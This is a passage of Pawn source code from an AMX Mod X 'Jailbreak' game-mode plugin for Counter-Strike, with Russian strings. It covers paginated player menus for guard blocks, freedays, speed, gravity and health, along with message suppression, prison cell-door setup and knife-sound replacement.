		case 3: return Show_MarkerMenu(id);
		case 8: return Show_PrivilegesMenu(id);
		case 9: return PLUGIN_HANDLED;
	}
	return Show_DemonMenu_2(id);
}

Cmd_BlockedGuardMenu(id) return Show_BlockedGuardMenu(id, g_iMenuPosition[id] = 0);
Show_BlockedGuardMenu(id, iPos)
{
	if(iPos < 0) return PLUGIN_HANDLED;
	jbe_informer_offset_up(id);
	new iPlayersNum;
	for(new i = 1; i <= g_iMaxPlayers; i++)
	{
		if(IsNotSetBit(g_iBitUserConnected, i)) continue;
		g_iMenuPlayers[id][iPlayersNum++] = i;
	}
	new iStart = iPos * PLAYERS_PER_PAGE;
	if(iStart > iPlayersNum) iStart = iPlayersNum;
	iStart = iStart - (iStart % 8);
	g_iMenuPosition[id] = iStart / PLAYERS_PER_PAGE;
	new iEnd = iStart + PLAYERS_PER_PAGE;
	if(iEnd > iPlayersNum) iEnd = iPlayersNum;
	new szMenu[512], iLen, iPagesNum = (iPlayersNum / PLAYERS_PER_PAGE + ((iPlayersNum % PLAYERS_PER_PAGE) ? 1 : 0));
	switch(iPagesNum)
	{
		case 0:
		{
			UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ID_PLAYERS_NOT_VALID");
			switch(g_iUserTeam[id])
			{
				case 1, 2: return Show_AlphaMenu(id);
				default: return PLUGIN_HANDLED;
			}
		}
		default: iLen = formatex(szMenu, charsmax(szMenu), "\w%L \w[%d/%d]^n^n", id, "JBE_MENU_BLOCKED_GUARD_TITLE", iPos + 1, iPagesNum);
	}
	new szName[32], i, iKeys = (1<<9), b;
	for(new a = iStart; a < iEnd; a++)
	{
		i = g_iMenuPlayers[id][a];
		get_user_name(i, szName, charsmax(szName));
		iKeys |= (1<<b);
		if(IsSetBit(g_iBitUserBlockedGuard, i)) iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[%d] \w%s \rБлок^n", ++b, szName);
		else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[%d] \w%s^n", ++b, szName);
	}
	for(new i = b; i < PLAYERS_PER_PAGE; i++) iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n");
	if(iEnd < iPlayersNum)
	{
		iKeys |= (1<<8);
		formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L^n\r[0] \w%L", id, "JBE_MENU_NEXT", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
	}
	else formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n^n\r[0] \w%L", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_BlockedGuardMenu");
}

public Handle_BlockedGuardMenu(id, iKey)
{
	switch(iKey)
	{
		case 8: return Show_BlockedGuardMenu(id, ++g_iMenuPosition[id]);
		case 9: return Show_BlockedGuardMenu(id, --g_iMenuPosition[id]);
		default:
		{
			new iTarget = g_iMenuPlayers[id][g_iMenuPosition[id] * PLAYERS_PER_PAGE + iKey];
			new szName[32], szTargetName[32];
			new sQuery[256], iClient[3];
			get_user_name(id , szName, charsmax(szName));
			get_user_name(iTarget, szTargetName, charsmax(szTargetName));
			if(IsSetBit(g_iBitUserBlockedGuard, iTarget))
			{
	   			ClearBit(g_iBitUserBlockedGuard, iTarget);
				UTIL_SayText(0, "%L !tАльфа !g%s !tразблокировал !gвход !tза охрану игроку !g%s", LANG_PLAYER, "JBE_PREFIX", szName, szTargetName);
				set_dhudmessage(0, 200, 0, -1.0, 0.35, 0, 6.0, 3.0);
				show_dhudmessage(iTarget, "Вас разблокировали!");

				formatex(sQuery, charsmax(sQuery), "DELETE FROM `%sblocks` WHERE `%sblocks`.`steam_id`='%s'", UTIL_GetCvarString("jbe_sql_prefixes"), UTIL_GetCvarString("jbe_sql_prefixes"), uSteamId[iTarget]);
			
				iClient[0] = iTarget;
				iClient[1] = 0;
				
				SQL_ThreadQuery(hSql, "SQL_Handler", sQuery, iClient, sizeof iClient);
			}
			else
			{
				if(g_iUserTeam[iTarget] == 2) jbe_set_user_team(iTarget, 1);
				SetBit(g_iBitUserBlockedGuard, iTarget);
				UTIL_SayText(0, "%L !tАльфа !g%s !tзаблокировал !gвход !tза охрану игроку !g%s", LANG_PLAYER, "JBE_PREFIX", szName, szTargetName);
				set_dhudmessage(0, 200, 0, -1.0, 0.35, 0, 6.0, 3.0);
				show_dhudmessage(iTarget, "Вас заблокировали!");

				formatex(sQuery, charsmax(sQuery), "SELECT * FROM `%sblocks` WHERE `steam_id` LIKE '%s'",  UTIL_GetCvarString("jbe_sql_prefixes"), uSteamId[iTarget]);

				iClient[0] = iTarget;
				iClient[1] = 1;
			
				SQL_ThreadQuery(hSql, "SQL_Handler", sQuery, iClient, sizeof iClient);
			}
		}
	}
	return Show_BlockedGuardMenu(id, g_iMenuPosition[id]);
}

Cmd_GiveFdMenu(id) return Show_GiveFdMenu(id, g_iMenuPosition[id] = 0);
Show_GiveFdMenu(id, iPos)
{
	if(iPos < 0 || IsNotSetBit(g_iBitUserAlive, id)) return PLUGIN_HANDLED;
	jbe_informer_offset_up(id);
	new iPlayersNum;
	for(new i = 1; i <= g_iMaxPlayers; i++)
	{
		if(g_iUserTeam[i] != 1 || IsSetBit(g_iBitUserFreeNextRound, i) || IsSetBit(g_iBitUserWanted, i) || IsSetBit(g_iBitUserFree, i)) continue;
		g_iMenuPlayers[id][iPlayersNum++] = i;
	}
	new iStart = iPos * PLAYERS_PER_PAGE;
	if(iStart > iPlayersNum) iStart = iPlayersNum;
	iStart = iStart - (iStart % 8);
	g_iMenuPosition[id] = iStart / PLAYERS_PER_PAGE;
	new iEnd = iStart + PLAYERS_PER_PAGE;
	if(iEnd > iPlayersNum) iEnd = iPlayersNum;
	new szMenu[512], iLen, iPagesNum = (iPlayersNum / PLAYERS_PER_PAGE + ((iPlayersNum % PLAYERS_PER_PAGE) ? 1 : 0));
	switch(iPagesNum)
	{
		case 0:
		{
			UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ID_PLAYERS_NOT_VALID");
			switch(g_iUserTeam[id])
			{
				case 1, 2: return Show_EliteMenu(id);
				default: return PLUGIN_HANDLED;
			}
		}
		default: iLen = formatex(szMenu, charsmax(szMenu), "\w%L \w[%d/%d]^n^n", id, "JBE_MENU_FREEDAY_TITLE", iPos + 1, iPagesNum);
	}
	new szName[32], i, iKeys = (1<<9), b;
	for(new a = iStart; a < iEnd; a++)
	{
		i = g_iMenuPlayers[id][a];
		get_user_name(i, szName, charsmax(szName));
		iKeys |= (1<<b);
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[%d] \w%s^n", ++b, szName);
	}
	for(new i = b; i < PLAYERS_PER_PAGE; i++) iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n");
	if(iEnd < iPlayersNum)
	{
		iKeys |= (1<<8);
		formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L^n\r[0] \w%L", id, "JBE_MENU_NEXT", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
	}
	else formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n^n\r[0] \w%L", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_GiveFdMenu");
}

public Handle_GiveFdMenu(id, iKey)
{
	switch(iKey)
	{
		case 8: return Show_GiveFdMenu(id, ++g_iMenuPosition[id]);
		case 9: return Show_GiveFdMenu(id, --g_iMenuPosition[id]);
		default:
		{
			new iTarget = g_iMenuPlayers[id][g_iMenuPosition[id] * PLAYERS_PER_PAGE + iKey];
			new szName[32], szTargetName[32];
			get_user_name(id , szName, charsmax(szName));
			get_user_name(iTarget, szTargetName, charsmax(szTargetName));
			{
				jbe_add_user_free(iTarget);
				UTIL_SayText(0, "%L !tЭлита !g%s !tвыдал !gосвобождение !tигроку !g%s", LANG_PLAYER, "JBE_PREFIX", szName, szTargetName);
			    g_iEliteData[id][ELITE_FD] = 0;
			}
		}
	}
	return PLUGIN_HANDLED;
}

Cmd_GiveFustMenu(id) return Show_GiveFustMenu(id, g_iMenuPosition[id] = 0);
Show_GiveFustMenu(id, iPos)
{
	if(iPos < 0 || IsNotSetBit(g_iBitUserAlive, id)) return PLUGIN_HANDLED;
	new iPlayersNum;
	for(new i = 1; i <= g_iMaxPlayers; i++)
	{
		if(g_iUserTeam[i] != 1 && g_iUserTeam[i] != 2 || IsNotSetBit(g_iBitUserAlive, i) || IsSetBit(g_iBitFastRun, i) || IsSetBit(g_iBitUserBoxing, id) || IsSetBit(g_iBitUserDuel, id)) continue;
		g_iMenuPlayers[id][iPlayersNum++] = i;
	}
	new iStart = iPos * PLAYERS_PER_PAGE;
	if(iStart > iPlayersNum) iStart = iPlayersNum;
	iStart = iStart - (iStart % 8);
	g_iMenuPosition[id] = iStart / PLAYERS_PER_PAGE;
	new iEnd = iStart + PLAYERS_PER_PAGE;
	if(iEnd > iPlayersNum) iEnd = iPlayersNum;
	new szMenu[512], iLen, iPagesNum = (iPlayersNum / PLAYERS_PER_PAGE + ((iPlayersNum % PLAYERS_PER_PAGE) ? 1 : 0));
	switch(iPagesNum)
	{
		case 0:
		{
			UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ID_PLAYERS_NOT_VALID");
			return Show_ChiefMenu_1(id);
		}
		default: iLen = formatex(szMenu, charsmax(szMenu), "\w%L \w[%d/%d]^n^n", id, "JBE_MENU_SPEED_TITLE", iPos + 1, iPagesNum);
	}
	new szName[32], i, iKeys = (1<<9), b;
	for(new a = iStart; a < iEnd; a++)
	{
		i = g_iMenuPlayers[id][a];
		get_user_name(i, szName, charsmax(szName));
		iKeys |= (1<<b);
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[%d] \w%s^n", ++b, szName);
	}
	for(new i = b; i < PLAYERS_PER_PAGE; i++) iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n");
	if(iEnd < iPlayersNum)
	{
		iKeys |= (1<<8);
		formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L^n\r[0] \w%L", id, "JBE_MENU_NEXT", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
	}
	else formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n^n\r[0] \w%L", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_GiveFustMenu");
}

public Handle_GiveFustMenu(id, iKey)
{
	switch(iKey)
	{
		case 8: return Show_GiveFustMenu(id, ++g_iMenuPosition[id]);
		case 9: return Show_GiveFustMenu(id, --g_iMenuPosition[id]);
		default:
		{
			new iTarget = g_iMenuPlayers[id][g_iMenuPosition[id] * PLAYERS_PER_PAGE + iKey];
			new szName[32], szTargetName[32];
			get_user_name(id , szName, charsmax(szName));
			get_user_name(iTarget, szTargetName, charsmax(szTargetName));
			{
				SetBit(g_iBitFastRun, iTarget);
			    ExecuteHamB(Ham_Player_ResetMaxSpeed, iTarget);
				UTIL_SayText(0, "%L !tЭлита !g%s !tвыдал !gскорость !tигроку !g%s", LANG_PLAYER, "JBE_PREFIX", szName, szTargetName);
			    g_iEliteSpeed[id]--;
			}
		}
	}
	return PLUGIN_HANDLED;
}

Cmd_GiveGravMenu(id) return Show_GiveGravMenu(id, g_iMenuPosition[id] = 0);
Show_GiveGravMenu(id, iPos)
{
	if(iPos < 0 || IsNotSetBit(g_iBitUserAlive, id)) return PLUGIN_HANDLED;
	jbe_informer_offset_up(id);
	new iPlayersNum;
	for(new i = 1; i <= g_iMaxPlayers; i++)
	{
		if(g_iUserTeam[i] != 1 && g_iUserTeam[i] != 2 || IsNotSetBit(g_iBitUserAlive, i) || IsSetBit(g_iBitUserBoxing, id) || IsSetBit(g_iBitUserDuel, id)) continue;
		g_iMenuPlayers[id][iPlayersNum++] = i;
	}
	new iStart = iPos * PLAYERS_PER_PAGE;
	if(iStart > iPlayersNum) iStart = iPlayersNum;
	iStart = iStart - (iStart % 8);
	g_iMenuPosition[id] = iStart / PLAYERS_PER_PAGE;
	new iEnd = iStart + PLAYERS_PER_PAGE;
	if(iEnd > iPlayersNum) iEnd = iPlayersNum;
	new szMenu[512], iLen, iPagesNum = (iPlayersNum / PLAYERS_PER_PAGE + ((iPlayersNum % PLAYERS_PER_PAGE) ? 1 : 0));
	switch(iPagesNum)
	{
		case 0:
		{
			UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ID_PLAYERS_NOT_VALID");
			switch(g_iUserTeam[id])
			{
				case 1, 2: return Show_EliteMenu(id);
				default: return PLUGIN_HANDLED;
			}
		}
		default: iLen = formatex(szMenu, charsmax(szMenu), "\w%L \w[%d/%d]^n^n", id, "JBE_MENU_GRAVITI_TITLE", iPos + 1, iPagesNum);
	}
	new szName[32], i, iKeys = (1<<9), b;
	for(new a = iStart; a < iEnd; a++)
	{
		i = g_iMenuPlayers[id][a];
		get_user_name(i, szName, charsmax(szName));
		iKeys |= (1<<b);
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[%d] \w%s^n", ++b, szName);
	}
	for(new i = b; i < PLAYERS_PER_PAGE; i++) iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n");
	if(iEnd < iPlayersNum)
	{
		iKeys |= (1<<8);
		formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L^n\r[0] \w%L", id, "JBE_MENU_NEXT", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
	}
	else formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n^n\r[0] \w%L", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_GiveGravMenu");
}

public Handle_GiveGravMenu(id, iKey)
{
	switch(iKey)
	{
		case 8: return Show_GiveGravMenu(id, ++g_iMenuPosition[id]);
		case 9: return Show_GiveGravMenu(id, --g_iMenuPosition[id]);
		default:
		{
			new iTarget = g_iMenuPlayers[id][g_iMenuPosition[id] * PLAYERS_PER_PAGE + iKey];
			new szName[32], szTargetName[32];
			get_user_name(id , szName, charsmax(szName));
			get_user_name(iTarget, szTargetName, charsmax(szTargetName));
			{
				set_pev(iTarget, pev_gravity, 0.6);
				UTIL_SayText(0, "%L !tЭлита !g%s !tвыдал !gгравитацию !tигроку !g%s", LANG_PLAYER, "JBE_PREFIX", szName, szTargetName);
				g_iEliteGrav[id]--;
			}
		}
	}
	return PLUGIN_HANDLED;
}

Cmd_GiveHealthMenu(id) return Show_GiveHealthMenu(id, g_iMenuPosition[id] = 0);
Show_GiveHealthMenu(id, iPos)
{
	if(iPos < 0 || IsNotSetBit(g_iBitUserAlive, id)) return PLUGIN_HANDLED;
	jbe_informer_offset_up(id);
	new iPlayersNum;
	for(new i = 1; i <= g_iMaxPlayers; i++)
	{
		if(g_iUserTeam[i] != 1 && g_iUserTeam[i] != 2 || IsNotSetBit(g_iBitUserAlive, i) || get_user_health(i) >= 100 || IsSetBit(g_iBitUserBoxing, id) || IsSetBit(g_iBitUserDuel, id)) continue;
		g_iMenuPlayers[id][iPlayersNum++] = i;
	}
	new iStart = iPos * PLAYERS_PER_PAGE;
	if(iStart > iPlayersNum) iStart = iPlayersNum;
	iStart = iStart - (iStart % 8);
	g_iMenuPosition[id] = iStart / PLAYERS_PER_PAGE;
	new iEnd = iStart + PLAYERS_PER_PAGE;
	if(iEnd > iPlayersNum) iEnd = iPlayersNum;
	new szMenu[512], iLen, iPagesNum = (iPlayersNum / PLAYERS_PER_PAGE + ((iPlayersNum % PLAYERS_PER_PAGE) ? 1 : 0));
	switch(iPagesNum)
	{
		case 0:
		{
			UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ID_PLAYERS_NOT_VALID");
			return Show_EliteMenu(id);
		}
		default: iLen = formatex(szMenu, charsmax(szMenu), "\w%L \w[%d/%d]^n^n", id, "JBE_MENU_HEALTH_TITLE", iPos + 1, iPagesNum);
	}
	new szName[32], i, iKeys = (1<<9), b;
	for(new a = iStart; a < iEnd; a++)
	{
		i = g_iMenuPlayers[id][a];
		get_user_name(i, szName, charsmax(szName));
		iKeys |= (1<<b);
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[%d] \w%s \y%dHP^n", ++b, szName, get_user_health(i));
	}
	for(new i = b; i < PLAYERS_PER_PAGE; i++) iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n");
	if(iEnd < iPlayersNum)
	{
		iKeys |= (1<<8);
		formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L^n\r[0] \w%L", id, "JBE_MENU_NEXT", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
	}
	else formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n^n\r[0] \w%L", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_GiveHealthMenu");
}

public Handle_GiveHealthMenu(id, iKey)
{
	switch(iKey)
	{
		case 8: return Show_GiveHealthMenu(id, ++g_iMenuPosition[id]);
		case 9: return Show_GiveHealthMenu(id, --g_iMenuPosition[id]);
		default:
		{
			new iTarget = g_iMenuPlayers[id][g_iMenuPosition[id] * PLAYERS_PER_PAGE + iKey];
			if(IsSetBit(g_iBitUserAlive, iTarget) && get_user_health(iTarget) < 100 && IsNotSetBit(g_iBitUserBoxing, id) && IsNotSetBit(g_iBitUserDuel, id))
			{
				new szName[32], szTargetName[32];
				get_user_name(id, szName, charsmax(szName));
				get_user_name(iTarget, szTargetName, charsmax(szTargetName));
				set_pev(iTarget, pev_health, 100.0);
				UTIL_SayText(0, "%L !tЭлита !g%s !tВылечил игрока !g%s", LANG_PLAYER, "JBE_PREFIX", szName, szTargetName);
			    g_iEliteHealth[id]--;
			}
		}
	}
	return PLUGIN_HANDLED;
}

Show_ManageSoundMenu(id)
{
	jbe_informer_offset_up(id);
	new szMenu[512], iKeys = (1<<0|1<<1|1<<8|1<<9), iLen = formatex(szMenu, charsmax(szMenu), "\w%L^n^n", id, "JBE_MENU_MANAGE_SOUND_TITLE");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \w%L^n", id, "JBE_MENU_MANAGE_SOUND_STOP_MP3");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \w%L^n", id, "JBE_MENU_MANAGE_SOUND_STOP_ALL");
	if(g_iRoundSoundSize)
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \w%L \r[%L]^n^n^n^n^n^n", id, "JBE_MENU_MANAGE_SOUND_ROUND_SOUND", id, IsSetBit(g_iBitUserRoundSound, id) ? "JBE_MENU_ENABLE" : "JBE_MENU_DISABLE");
		iKeys |= (1<<2);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L \r[%L]^n^n^n^n^n^n", id, "JBE_MENU_MANAGE_SOUND_ROUND_SOUND");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L", id, "JBE_MENU_BACK");
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_ManageSoundMenu");
}

public Handle_ManageSoundMenu(id, iKey)
{
	switch(iKey)
	{
		case 0: client_cmd(id, "mp3 stop");
		case 1: client_cmd(id, "stopsound");
		case 2: InvertBit(g_iBitUserRoundSound, id);
		case 8:
		{
			switch(g_iUserTeam[id])
			{
				case 1: return Show_MainPnMenu(id);
				case 2: return Show_MainGrMenu(id);
			}
		}
		case 9: return PLUGIN_HANDLED;
	}
	return Show_ManageSoundMenu(id);
}
/*===== <- Меню <- =====*///}

/*===== -> Сообщения -> =====*///{***
#define VGUIMenu_TeamMenu 2
#define VGUIMenu_ClassMenuTe 26
#define VGUIMenu_ClassMenuCt 27
#define ShowMenu_TeamMenu 19
#define ShowMenu_TeamSpectMenu 51
#define ShowMenu_IgTeamMenu 531
#define ShowMenu_IgTeamSpectMenu 563
#define ShowMenu_ClassMenu 31

message_init()
{
	register_message(MsgId_TextMsg, "Message_TextMsg");
	register_message(MsgId_ResetHUD, "Message_ResetHUD");
	register_message(MsgId_ShowMenu, "Message_ShowMenu");
	register_message(MsgId_Money, "Message_Money");
	register_message(MsgId_VGUIMenu, "Message_VGUIMenu");
	register_message(MsgId_ClCorpse, "Message_ClCorpse");
	register_message(MsgId_HudTextArgs, "Message_HudTextArgs");
	register_message(MsgId_SendAudio, "Message_SendAudio");
	register_message(MsgId_StatusText, "Message_StatusText");
	register_message(get_user_msgid("CurWeapon"), "message_cur_weapon");
}

public Message_TextMsg()
{
	new szArg[32];
	get_msg_arg_string(2, szArg, charsmax(szArg));
	if(szArg[0] == '#' && (szArg[1] == 'G' && szArg[2] == 'a' && szArg[3] == 'm'
	&& (equal(szArg[6], "teammate_attack", 15) // %s attacked a teammate
	|| equal(szArg[6], "teammate_kills", 14) // Teammate kills: %s of 3
	|| equal(szArg[6], "join_terrorist", 14) // %s is joining the Terrorist force
	|| equal(szArg[6], "join_ct", 7) // %s is joining the Counter-Terrorist force
	|| equal(szArg[6], "scoring", 7) // Scoring will not start until both teams have players
	|| equal(szArg[6], "will_restart_in", 15) // The game will restart in %s1 %s2
	|| equal(szArg[6], "Commencing", 10)) // Game Commencing!
	|| szArg[1] == 'K' && szArg[2] == 'i' && szArg[3] == 'l' && equal(szArg[4], "led_Teammate", 12))) // You killed a teammate!
		return PLUGIN_HANDLED;
	if(get_msg_args() != 5) return PLUGIN_CONTINUE;
	get_msg_arg_string(5, szArg, charsmax(szArg));
	if(szArg[1] == 'F' && szArg[2] == 'i' && szArg[3] == 'r' && equal(szArg[4], "e_in_the_hole", 13)) // Fire in the hole!
		return PLUGIN_HANDLED;
	return PLUGIN_CONTINUE;
}

public Message_ResetHUD(iMsgId, iMsgDest, iReceiver)
{
	if(IsNotSetBit(g_iBitUserConnected, iReceiver)) return;
	set_pdata_int(iReceiver, m_iClientHideHUD, 0);
	set_pdata_int(iReceiver, m_iHideHUD, (1<<4));
}

public Message_ShowMenu(iMsgId, iMsgDest, iReceiver)
{
	switch(get_msg_arg_int(1))
	{
		case ShowMenu_TeamMenu, ShowMenu_TeamSpectMenu:
		{
			Show_ChooseTeamMenu(iReceiver, 0);
			return PLUGIN_HANDLED;
		}
		case ShowMenu_ClassMenu, ShowMenu_IgTeamMenu, ShowMenu_IgTeamSpectMenu: return PLUGIN_HANDLED;
	}
	return PLUGIN_CONTINUE;
}

public Message_Money() return PLUGIN_HANDLED;

public Message_VGUIMenu(iMsgId, iMsgDest, iReceiver)
{
	switch(get_msg_arg_int(1))
	{
		case VGUIMenu_TeamMenu:
		{
			Show_ChooseTeamMenu(iReceiver, 0);
			return PLUGIN_HANDLED;
		}
		case VGUIMenu_ClassMenuTe, VGUIMenu_ClassMenuCt: return PLUGIN_HANDLED;
	}
	return PLUGIN_CONTINUE;
}

public Message_ClCorpse() return PLUGIN_HANDLED;
public Message_HudTextArgs() return PLUGIN_HANDLED;

public Message_SendAudio()
{
	new szArg[32];
	get_msg_arg_string(2, szArg, charsmax(szArg));
	if(szArg[0] == '%' && (szArg[2] == 'M' && szArg[3] == 'R' && szArg[4] == 'A' && szArg[5] == 'D'
	&& equal(szArg[7], "FIREINHOLE", 10))) // !MRAD_FIREINHOLE
		return PLUGIN_HANDLED;
	return PLUGIN_CONTINUE;
}

public Message_StatusText() return PLUGIN_HANDLED;
/*===== <- Сообщения <- =====*///}

/*===== -> Двери в тюремных камерах -> =====*///{***
door_init()
{
	g_aDoorList = ArrayCreate();
	new iEntity[2], Float:vecOrigin[3], szClassName[32], szTargetName[32];
	while((iEntity[0] = engfunc(EngFunc_FindEntityByString, iEntity[0], "classname", "info_player_deathmatch")))
	{
		pev(iEntity[0], pev_origin, vecOrigin);
		while((iEntity[1] = engfunc(EngFunc_FindEntityInSphere, iEntity[1], vecOrigin, 200.0)))
		{
			if(!pev_valid(iEntity[1])) continue;
			pev(iEntity[1], pev_classname, szClassName, charsmax(szClassName));
			if(szClassName[5] != 'd' && szClassName[6] != 'o' && szClassName[7] != 'o' && szClassName[8] != 'r') continue;
			if(pev(iEntity[1], pev_iuser1) == IUSER1_DOOR_KEY) continue;
			pev(iEntity[1], pev_targetname, szTargetName, charsmax(szTargetName));
			if(TrieKeyExists(g_tButtonList, szTargetName))
			{
				set_pev(iEntity[1], pev_iuser1, IUSER1_DOOR_KEY);
				ArrayPushCell(g_aDoorList, iEntity[1]);
				fm_set_kvd(iEntity[1], szClassName, "spawnflags", "0");
				fm_set_kvd(iEntity[1], szClassName, "wait", "-1");
			}
		}
	}
	g_iDoorListSize = ArraySize(g_aDoorList);
}
/*===== <- Двери в тюремных камерах <- =====*///}

/*===== -> 'fakemeta' события -> =====*///{
fakemeta_init()
{
	TrieDestroy(g_tButtonList);
	unregister_forward(FM_KeyValue, g_iFakeMetaKeyValue, true);
	TrieDestroy(g_tRemoveEntities);
	unregister_forward(FM_Spawn, g_iFakeMetaSpawn, true);
	register_forward(FM_EmitSound, "FakeMeta_EmitSound", false);
	register_forward(FM_SetClientKeyValue, "FakeMeta_SetClientKeyValue", false);
	register_forward(FM_Voice_SetClientListening, "FakeMeta_Voice_SetListening", false);
	register_forward(FM_SetModel, "FakeMeta_SetModel", false);
	register_forward(FM_PlayerPreThink, "FM_PreThink");
	register_forward(FM_PlayerPreThink, "FakeMeta_PreThink", false);
}

public FakeMeta_KeyValue_Post(iEntity, KVD_Handle)
{
	if(!pev_valid(iEntity)) return;
	new szBuffer[32];
	get_kvd(KVD_Handle, KV_ClassName, szBuffer, charsmax(szBuffer));
	if((szBuffer[5] != 'b' || szBuffer[6] != 'u' || szBuffer[7] != 't') && (szBuffer[0] != 'b' || szBuffer[1] != 'u' || szBuffer[2] != 't')) return; // func_button
	get_kvd(KVD_Handle, KV_KeyName, szBuffer, charsmax(szBuffer));
	if(szBuffer[0] != 't' || szBuffer[1] != 'a' || szBuffer[3] != 'g') return; // target
	get_kvd(KVD_Handle, KV_Value, szBuffer, charsmax(szBuffer));
	TrieSetCell(g_tButtonList, szBuffer, iEntity);
}

public FakeMeta_Spawn_Post(iEntity)
{
	if(!pev_valid(iEntity)) return;
	new szClassName[32];
	pev(iEntity, pev_classname, szClassName, charsmax(szClassName));
	if(TrieKeyExists(g_tRemoveEntities, szClassName))
	{
		if(szClassName[5] == 'u' && pev(iEntity, pev_iuser1) == IUSER1_BUYZONE_KEY) return;
		engfunc(EngFunc_RemoveEntity, iEntity);
	}
}

public FakeMeta_EmitSound(id, iChannel, szSample[], Float:fVolume, Float:fAttn, iFlag, iPitch)
{
	if(jbe_is_user_valid(id))
	{
		if(szSample[8] == 'k' && szSample[9] == 'n' && szSample[10] == 'i' && szSample[11] == 'f' && szSample[12] == 'e')
		{
			if(g_bSoccerStatus && IsSetBit(g_iBitUserSoccer, id))
			{
				switch(szSample[17])
				{
					case 'l': emit_sound(id, iChannel, "jb_engine/weapons/hand_deploy.wav", fVolume, fAttn, iFlag, iPitch); // knife_deploy1.wav
					case 'w': emit_sound(id, iChannel, "jb_engine/weapons/hand_hit.wav", fVolume, fAttn, iFlag, iPitch); // knife_hitwall1.wav
					case 's': emit_sound(id, iChannel, "jb_engine/weapons/hand_slash.wav", fVolume, fAttn, iFlag, iPitch); // knife_slash(1-2).wav
					case 'b': emit_sound(id, iChannel, "jb_engine/weapons/hand_hit.wav", fVolume, fAttn, iFlag, iPitch); // knife_stab.wav
					default: emit_sound(id, iChannel, "jb_engine/weapons/hand_hit.wav", fVolume, fAttn, iFlag, iPitch); // knife_hit(1-4).wav
				}
				return FMRES_SUPERCEDE;
			}
			if(g_bBoxingStatus && IsSetBit(g_iBitUserBoxing, id))
			{
				switch(szSample[17])
				{
					case 'l': emit_sound(id, iChannel, "jb_engine/weapons/hand_deploy.wav", fVolume, fAttn, iFlag, iPitch); // knife_deploy1.wav
					case 'w': emit_sound(id, iChannel, "jb_engine/boxing/gloves_hit.wav", fVolume, fAttn, iFlag, iPitch); // knife_hitwall1.wav
					case 's': emit_sound(id, iChannel, "jb_engine/weapons/hand_slash.wav", fVolume, fAttn, iFlag, iPitch); // knife_slash(1-2).wav
					case 'b': emit_sound(id, iChannel, "jb_engine/boxing/gloves_hit.wav", fVolume, fAttn, iFlag, iPitch); // knife_stab.wav
					default: emit_sound(id, iChannel, "jb_engine/boxing/gloves_hit.wav", fVolume, fAttn, iFlag, iPitch); // knife_hit(1-4).wav
				}
				return FMRES_SUPERCEDE;
			}
			if(g_iBitWeaponStatus && IsSetBit(g_iBitWeaponStatus, id))
			{
				switch(szSample[17])
				{
					case 'l':
					{
						if(IsSetBit(g_iBitShocker, id)) emit_sound(id, iChannel, g_szSounds[SHOCKER_DEPLOY], fVolume, fAttn, iFlag, iPitch);
						else if(IsSetBit(g_iBitSharpening, id)) emit_sound(id, iChannel, g_szSounds[ULTRAHAND_DEPLOY], fVolume, fAttn, iFlag, iPitch); // knife_deploy1.wav
						else if(IsSetBit(g_iBitScrewdriver, id)) emit_sound(id, iChannel, g_szSounds[ZEKIRA_DEPLOY], fVolume, fAttn, iFlag, iPitch); // knife_deploy1.wav
